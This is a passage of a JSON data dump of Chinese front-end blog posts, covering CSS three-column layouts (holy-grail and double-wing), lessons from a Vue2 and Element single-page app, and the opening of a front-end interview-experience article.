子元素宽度;\u003c/code\u003e。这种方式也很好理解。\u003c/li\u003e\n\u003cli\u003e上面的绝对定位方法只要将 \u003ccode\u003emargin\u003c/code\u003e 改为 \u003ccode\u003etransform\u003c/code\u003e 就可以实现宽度和高度未知的居中（兼容性啊兄弟们！(ಥ_ಥ)）\u003ccode\u003etransformX:50%;transformY:50%\u003c/code\u003e；\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e不行，感觉总结的还是很渣，╮(╯▽╰)╭哎，谁有好的方法，求推荐。\u003c/p\u003e\n\u003ch1 id=\"-\"\u003e圣杯布局\u003c/h1\u003e\n\u003cp\u003e其实我还真是第一次听说圣杯布局这种称呼，看了下这个名字的由来，貌似和布局并没有什么关系，圣杯布局倒是挺常见的三栏式布局。两边顶宽，中间自适应的三栏布局。\u003cbr\u003e效果如下：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/00913c0a5f49e94f13dd4a0bf5eea826\" alt=\"圣杯布局\"/\u003e\u003cfigcaption\u003e圣杯布局\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e这个布局方式的关键是怎么样才能使得在伸缩浏览器窗口的时候让中间的子元素宽度改变。可以适应浏览器的宽度变化使用百分比设置宽度再合适不过，所以我们要将中间子元素的宽度设置为 \u003ccode\u003e100%\u003c/code\u003e，左边和右边的子元素设置为固定的宽度。\u003c/p\u003e\n\u003cp\u003e我们就来实现一下这样的布局：\u003c/p\u003e\n\u003ch2 id=\"-html-\"\u003e给出HTML结构\u003c/h2\u003e\n\u003cp\u003eHTML 文件就很普通：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"container\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"middle\"\u003c/span\u003e\u0026gt;\u003c/span\u003e测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"left\"\u003c/span\u003e\u0026gt;\u003c/span\u003eleft\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"right\"\u003c/span\u003e\u0026gt;\u003c/span\u003eright\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cstrong\u003e这里我们要注意的是，中间栏要在放在文档流前面以优先渲染。\u003c/strong\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e给出每个子元素的样式\u003c/h2\u003e\n\u003cp\u003e然后我们写 CSS，我们现将其三个元素的宽度和高度设置好，然后都设置为 \u003ccode\u003efloat:left\u003c/code\u003e:\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.middle\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: paleturquoise;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003efloat\u003c/span\u003e: left;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.left\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: palevioletred;\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003efloat\u003c/span\u003e: left;\n            \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e40px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.right\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: purple;\n            \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e40px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003efloat\u003c/span\u003e: left;\n            \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这时的效果如下：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/42def5aa9d3b4df14c230506074b7ee0\" alt=\"圣杯布局\"/\u003e\u003cfigcaption\u003e圣杯布局\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e使子元素在同一行显示\u003c/h2\u003e\n\u003cp\u003e我们可以看出，现在三个子元素是在一排显示的，因为我们给中间的子元素设置的宽度是 \u003ccode\u003e100%\u003c/code\u003e，并且中间的子元素在文档流的最前面，最先被渲染。\u003c/p\u003e\n\u003cp\u003e那么我们要使得三个元素在同一排显示。接下来我们要将 \u003ccode\u003e.left\u003c/code\u003e 和 \u003ccode\u003e.right\u003c/code\u003e 向上提。实际上我们是使用 \u003ccode\u003emargin-left\u003c/code\u003e 为 负值来实现的，我们将 \u003ccode\u003e.left\u003c/code\u003e 的 \u003ccode\u003emargin-left\u003c/code\u003e 设置为 \u003ccode\u003e-100%\u003c/code\u003e（负的中间子元素的宽度），这样，左边的元素就会被“提升”到上一层。\u003c/p\u003e\n\u003cp\u003e然后就是右边子元素了，只需要设置 \u003ccode\u003emargin-left\u003c/code\u003e 设置为负的自身的宽度。\u003c/p\u003e\n\u003cp\u003e结果如下：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/929b5b13e3a9396bc4b43c8daaf275c4\" alt=\"这里写图片描述\"/\u003e\u003cfigcaption\u003e这里写图片描述\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e使得中间子元素不被遮盖\u003c/h2\u003e\n\u003cp\u003e从上一张截图显示中显示中间的子元素被遮挡了，所以说我们要解决这个问题，要怎么解决呢？嗯... 只要使得中间的子元素显示的宽度刚好为左边元素和右边元素显示中间的宽度就可以。同时我们还必须保证是使用的半分比的布局方式。\u003c/p\u003e\n\u003cp\u003e这样的话有一种方式可以即使中间的宽度减少，又可以使中间的宽度仍然使用 \u003ccode\u003e100%\u003c/code\u003e，那就是设置父元素的 \u003ccode\u003epadding\u003c/code\u003e 值，将父元素的 \u003ccode\u003epadding-left\u003c/code\u003e 设置为左边子元素的宽度，将父元素的 \u003ccode\u003epadding-right\u003c/code\u003e 设置为右边子元素的宽度。\u003c/p\u003e\n\u003cp\u003e显示效果如下：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/f4fbde95e4aa19f9ac021138e0106fdf\" alt=\"圣杯布局\"/\u003e\u003cfigcaption\u003e圣杯布局\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e将左边和右边的子元素像两边移动\u003c/h2\u003e\n\u003cp\u003e嗯... 这貌似也不是我们想要的效果，但是，中间的子元素确实是在中间了，那么我们只需要设置相对位置，将左边的子元素和右边的子元素向两边移动就好。\u003c/p\u003e\n\u003cp\u003e最终的 CSS 代码如下：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003epadding\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.middle\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: paleturquoise;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003efloat\u003c/span\u003e: left;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.left\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: palevioletred;\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003efloat\u003c/span\u003e: left;\n            \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e40px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003emargin-left\u003c/span\u003e:-\u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e;\n\n\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.right\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: purple;\n            \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e40px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003efloat\u003c/span\u003e: left;\n            \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003emargin-left\u003c/span\u003e:-\u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e最终效果如下：\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/5cca9436df9669d9abebdf7f8fd49c94\" alt=\"圣杯布局\"/\u003e\u003cfigcaption\u003e圣杯布局\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch1 id=\"-\"\u003e双飞翼布局\u003c/h1\u003e\n\u003cp\u003e其实双飞翼布局是为了解决圣杯布局的弊端提出的，如果你跟我一起将上面的圣杯布局的代码敲了一遍，你就会发现一个问题，当你将浏览器宽度缩短到一定程度的时候，会使得中间子元素的宽度比左右子元素宽度小的时候，这时候布局就会出现问题。所以首先，这提示了我们在使用圣杯布局的时候一定要设置整个容器的最小宽度。\u003c/p\u003e\n\u003cp\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/f83bca0c0e71b7dfb497853f0f5035ad\" alt=\"圣杯布局弊端\"/\u003e\u003cfigcaption\u003e圣杯布局弊端\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch2 id=\"-\"\u003e双飞翼和圣杯布局区别\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003e圣杯布局和双飞翼布局解决问题的方案在前一半是相同的，也就是三栏全部float浮动，但左右两栏加上负margin让其跟中间栏div并排，以形成三栏布局。\u003c/p\u003e\n\u003cp\u003e不同在于解决”中间栏div内容不被遮挡“问题的思路不一样：圣杯布局，为了中间div内容不被遮挡，将中间div设置了左右padding-left和padding-right后，将左右两个div用相对布局position: relative并分别配合right和left属性，以便左右两栏div移动后不遮挡中间div。\u003c/p\u003e\n\u003cp\u003e双飞翼布局，为了中间div内容不被遮挡，直接在中间div内部创建子div用于放置内容，在该子div里用margin-left和margin-right为左右两栏div留出位置。\u003c/p\u003e\n\u003cp\u003e作者：知乎用户\u003cbr\u003e链接：\u003ca href=\"https://www.zhihu.com/question/21504052/answer/50053054\" target=\"_blank\"\u003ehttps://www.zhihu.com/question/21504052/answer/50053054\u003c/a\u003e\u003cbr\u003e来源：知乎\u003cbr\u003e著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e所以只是一个小小的改动\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs html\"\u003e\u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"container\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"middle-container\"\u003c/span\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"middle\"\u003c/span\u003e\u0026gt;\u003c/span\u003e测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试测试\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"left\"\u003c/span\u003e\u0026gt;\u003c/span\u003eleft\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"hljs-tag\"\u003e\u0026lt;\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e \u003cspan class=\"hljs-attr\"\u003eclass\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"right\"\u003c/span\u003e\u0026gt;\u003c/span\u003eright\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"hljs-tag\"\u003e\u0026lt;/\u003cspan class=\"hljs-name\"\u003ediv\u003c/span\u003e\u0026gt;\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003cpre\u003e\u003ccode class=\"hljs css\"\u003e        \u003cspan class=\"hljs-selector-class\"\u003e.middle-container\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: paleturquoise;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003efloat\u003c/span\u003e: left;\n\n        }\n\n        \u003cspan class=\"hljs-selector-class\"\u003e.middle\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003emargin-left\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003emargin-right\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.left\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: palevioletred;\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003efloat\u003c/span\u003e: left;\n            \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e40px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003emargin-left\u003c/span\u003e:-\u003cspan class=\"hljs-number\"\u003e100%\u003c/span\u003e;\n\n\n        }\n        \u003cspan class=\"hljs-selector-class\"\u003e.right\u003c/span\u003e{\n            \u003cspan class=\"hljs-attribute\"\u003ewidth\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003eheight\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003ebackground\u003c/span\u003e: purple;\n            \u003cspan class=\"hljs-attribute\"\u003efont-size\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e40px\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003efloat\u003c/span\u003e: left;\n            \u003cspan class=\"hljs-attribute\"\u003ecolor\u003c/span\u003e: \u003cspan class=\"hljs-number\"\u003e#fff\u003c/span\u003e;\n            \u003cspan class=\"hljs-attribute\"\u003emargin-left\u003c/span\u003e:-\u003cspan class=\"hljs-number\"\u003e200px\u003c/span\u003e;\n\n        }\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e这样，在我们将中间元素宽度调到比两边元素小的时候，也是可以正常显示，但是如果总宽度小于左边元素或者右边元素的时候，还是会有问题。\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/61d393d131af1b12351d76dd2e2c288c\" alt=\"双飞翼布局\"/\u003e\u003cfigcaption\u003e双飞翼布局\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003ch1 id=\"-\"\u003e提问\u003c/h1\u003e\n\u003cp\u003e如果你已经看到了这里，那么很感谢，已经到最后了，我承认，这篇文章真的很长...\u003c/p\u003e\n\u003cp\u003e所以，来，打起精神，对于下面的布局方式，大家都什么好的布局方式或者奇淫技巧呢~\u003cbr\u003e\u003cfigure\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2017/8/20/7a4250b9d54bc95ed5816955a711b1be\" alt=\"布局方式\"/\u003e\u003cfigcaption\u003e布局方式\u003c/figcaption\u003e\u003c/figure\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e其实我只是想知道左边头像和下面的文字垂直居中有什么好的方法。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e此问题可以简化为，多个未知高度的元素如何垂直居中？对了，不使用 flex 和grid 布局，要求兼容 ie8+。\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e大家捧个场，可以直接发邮件将你的代码发给我，我邮件地址：991939332@qq.com，谢谢大家，谢谢谢谢\u003c/p\u003e\n","buildTime":"1514890668.4056","__v":0}
{"_id":{"$oid":"5a4cc287fa7d97296c4556c9"},"id":"5a16f5aef265da432e5baf1d","author":{"$oid":"5a4cc287fa7d97296c4556bc"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"基于 Vue2.0 + Element 的单页面可视化开发实践","meta":{"likeCount":0},"tag":["Vue.js","数据可视化","Element"],"comment":[],"shortContent":"项目迭代，要重构出一个可供用户操作的，可自由选择模板，可定制内容的页面。相当于这个单页面上最终展示的所有内容，都是由用户自己去定制完成的。 细想之后觉得使用 Vue 来做比较合适，因为页面上大部分操作都可理解为是对总体数据的再排序编辑。下边是记录的开发过程中一些相对关键的问题。…","content":"\u003ch4 class=\"heading\"\u003e需求\u003c/h4\u003e\n\u003cp\u003e项目迭代，要重构出一个可供用户操作的，可自由选择模板，可定制内容的页面。相当于这个单页面上最终展示的所有内容，都是由用户自己去定制完成的。\n细想之后觉得使用 Vue 来做比较合适，因为页面上大部分操作都可理解为是对总体数据的再排序编辑。下边是记录的开发过程中一些相对关键的问题。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eVue 原始数据的深复制\u003c/h4\u003e\n\u003cp\u003e由于 JS 对象的引用类型特点，在一些不需要双向绑定数据的时候，需要通过深拷贝原始的数据对象来暂存数据，即用 JSON.parse(JSON.stringify(...)) 的方式复制一份数据来进行操作。一般情况下组件间的数据干扰等情况都是由于此问题导致的。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e默认数据与已编辑数据的分离\u003c/h4\u003e\n\u003cp\u003e最开始做的时候未考虑到这个问题，使用了简单粗暴的方法调取默认数据，即在进入页面的时候复制一份数据充当默认数据。之后发现这个会导致用户操作数据后默认数据也跟着改变的问题。\n良好的解决方法就是相互分离，全部都是独立请求。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003eElement 的 Dialog 对话框监听\u003c/h4\u003e\n\u003cp\u003eDialog 方面，由于目前 Element 2.0版本是在页面加载时直接将需要用到的所有 Dialog 生成好然后 hide 掉，切换状态时只是执行了 show/hide 操作，考虑到复用性问题，并非销毁及重新生成，所以在数据的监听更新上会可能存在只有首次才能触发到的问题，处理办法之一就是监听影响对话框显示隐藏的属性，如官方示例中的 dialogVisible ，进而执行对话框显示时的数据更新等操作。\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e本地开发的数据请求跨域问题\u003c/h4\u003e\n\u003cp\u003e一方面可通过 webpack-dev-server 添加配置 \u003ccode\u003edisableHostCheck: true\u003c/code\u003e 来修改它的默认查找 hostname 的行为。也可以配置\u003ccode\u003econfig \u0026gt; index.js\u003c/code\u003e 下 proxyTable 来解决此问题。\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs bash\" lang=\"bash\"\u003eproxyTable: {\n  \u003cspan class=\"hljs-string\"\u003e'/api'\u003c/span\u003e: {\n    target: \u003cspan class=\"hljs-string\"\u003e'http://api.x.com'\u003c/span\u003e,\n    changeOrigin: \u003cspan class=\"hljs-literal\"\u003etrue\u003c/span\u003e,\n    pathRewrite: {\n      \u003cspan class=\"hljs-string\"\u003e'^/api'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'/api'\u003c/span\u003e\n    }\n  }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e另：Vue-CLI 的功能是其使用了 http-proxy-middleware 插件\ngithub：\u003ca target=\"_blank\" href=\"https://github.com/chimurai/http-proxy-middleware\"\u003ehttps://github.com/chimurai/http-proxy-middleware\u003c/a\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e数据的存储调取\u003c/h4\u003e\n\u003cp\u003e使用 localstorage 来存储用于区分身份的 ID，根据不同 ID 使用 axios 来进行服务端的数据请求。\n如果牵涉跨域是需要添加 JSONP 模块的。链接：\u003ca target=\"_blank\" href=\"https://github.com/axios/axios/blob/master/COOKBOOK.md#jsonp\"\u003ehttps://github.com/axios/axios/blob/master/COOKBOOK.md#jsonp\u003c/a\u003e\u003c/p\u003e\n\u003ch4 class=\"heading\"\u003e待改进\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003e未使用 Vue 懒加载，由于操作逻辑的复杂性，首页所有的 JS 文件将近800 KB ，如果以后迭代功能 JS 文件还可能更大，可能会有更大的 JS 文件，结果可能会导致首次加载等待时间较长，所以理想状态下是考虑加入懒加载，按需加载 JS 提前规划。\u003c/li\u003e\n\u003cli\u003e未使用 Vuex，目前组件间的数据通讯全都是通过 prop 传参的形式实现的。虽然目前组件间还不存在大范围共享数据的问题，但是引入 Vuex 进行数据处理还是很有必要的。随着项目的复杂化推进目前组件间的传参会越来越显的笨重。\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 class=\"heading\"\u003e在最后\u003c/h4\u003e\n\u003cp\u003e以上要点是整个首页项目提取出来的一些关键性问题，随着第一个Vue 项目的告一段落，不得不感叹数据驱动型真是简单、便捷、高效。相比之前 jQuery 的查找、绑定 DOM 而后再渲染确实完全没法比。尝试新事物总是让人兴奋不止。\u003c/p\u003e\n\u003cp\u003e\u003csmall\u003e补充中。。。\u003c/small\u003e\u003c/p\u003e\n\u003cp\u003e如有问题，欢迎指正！原博地址：\u003ca target=\"_blank\" href=\"http://tmac.wang/2017/11/%E5%9F%BA%E4%BA%8E%20Vue2.0%20+%20ElementUI%20%E7%9A%84%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%8F%AF%E8%A7%86%E5%8C%96%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/\"\u003ehttp://tmac.wang/2017/11/%E5%9F%BA%E4%BA%8E%20Vue2.0%20+%20ElementUI%20%E7%9A%84%E5%8D%95%E9%A1%B5%E9%9D%A2%E5%8F%AF%E8%A7%86%E5%8C%96%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/\u003c/a\u003e\u003c/p\u003e\n","buildTime":"1514963077.7656","__v":0}
{"_id":{"$oid":"5a4cc287fa7d97296c4556d1"},"id":"59ec3d50f265da431c6f7339","author":{"$oid":"5a4cc287fa7d97296c4556c2"},"imageCache":[{"imageUrlArray":[],"screenShot":null}],"title":"2018web前端面试总结","meta":{"likeCount":0},"tag":["面试","前端","Vue.js","设计"],"comment":[],"shortContent":"从今年3月份开始面试笔试找实习找校招到现在也半年多了，拿到了不少offer，也有了自己的一点心得体会，这里写出来分享一下，拙见勿喷。 笔试作为招聘的第一个环节，一般考察的都是专业基础知识，这里会着重考察你在学校的计算机相关基础，也就是很多人会发现，我明明考的是前端的卷子为啥前端…","content":"\u003cp\u003e从今年3月份开始面试笔试找实习找校招到现在也半年多了，拿到了不少offer，也有了自己的一点心得体会，这里写出来分享一下，拙见勿喷。\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e注意一下，以下的观点仅代表我个人的体会不代表任何人任何组织和任何公司。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch1\u003e关于流程\u003c/h1\u003e\n\u003cp\u003e一般的实习\u0026amp;校招招聘大体有这么一个流程：（这里我个人都是走的官网投递的渠道，没有经历过宣讲会的环节，这一部分我没啥经验）\u003c/p\u003e\n\u003ch2\u003e笔试\u003c/h2\u003e\n\u003cp\u003e笔试作为招聘的第一个环节，一般考察的都是专业基础知识，这里会着重考察你在学校的计算机相关基础，也就是很多人会发现，我明明考的是前端的卷子为啥前端的知识点考的这么少，而且有时候也会发现，前端的卷子考的没有前端的知识点。\u003c/p\u003e\n\u003cp\u003e笔试也是有种类之分的，像我参加的360和阿里的校招，笔试都是分为能力测试和技术笔试的，这里的能力测试也就是我们以前经常无视的逻辑思维题或者是分析题之类的；而技术笔试呢，顾名思义就是考察计算机基础和专业基础了，这里不废话了(提一点：可能你会遇到有的笔试编程题选不了js，这里就自己斟酌了)。\u003c/p\u003e\n\u003cp\u003e关于基础知识，这里就是\u003cstrong\u003e计算机网络、操作系统